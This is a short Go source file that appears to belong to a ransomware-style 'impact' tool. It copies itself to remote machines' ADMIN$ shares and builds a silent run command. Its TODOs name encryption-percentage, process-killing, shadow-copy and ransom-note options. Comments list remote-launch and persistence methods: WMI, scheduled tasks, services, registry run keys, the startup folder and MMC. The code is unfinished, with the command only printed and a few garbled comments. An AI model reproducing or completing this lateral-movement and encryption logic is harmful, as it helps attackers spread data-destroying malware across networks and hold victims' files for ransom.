package main

import "fmt"

func handleRemoteTargets(targets []string, args map[string]any) {
	for _, v := range targets {
		fmt.Println("Starting on target: ", v)
		commandLine := ""
		executableLocation := fmt.Sprintf("\\\\%s\\ADMIN$\\1010911_impact.exe", v)
		err := copySelf(executableLocation)
		if err != nil {
			printFormattedMessage(fmt.Sprintf("Failed to copy self to target %s: %s", v, err.Error()), ERROR)
			continue
		}
		commandLine = executableLocation
		commandLine = fmt.Sprintf("%s -skipconfirm -directory \"%s\"", commandLine, args["target"].(string))
		if args["recursive"].(bool) {
			commandLine = fmt.Sprintf("%s -recursive", commandLine)
		}
		// TODO - group
		// TODO - keys
		// TODO - workers
		// TODO - killprocs
		// TODO - vss
		// TODO - method pass
		// TODO - encryption percent
		// TODO - force_note_name
		// TODO - force_extension
		// TODO - threshold_auto_fullencrypt
		fmt.Println(commandLine)
	}
}

func execute() {
	// If wmi, we will launch a process remotely
	// If task, we will create a remote scheduled task and immediately invoke
	// If service, we will create a remote sece and immediately invokervi
	// If reg, will set a startup item in the registry to launch at next logon
	// If startup, will use startup folder
	// If mmc, wil use specific COM methodology
}
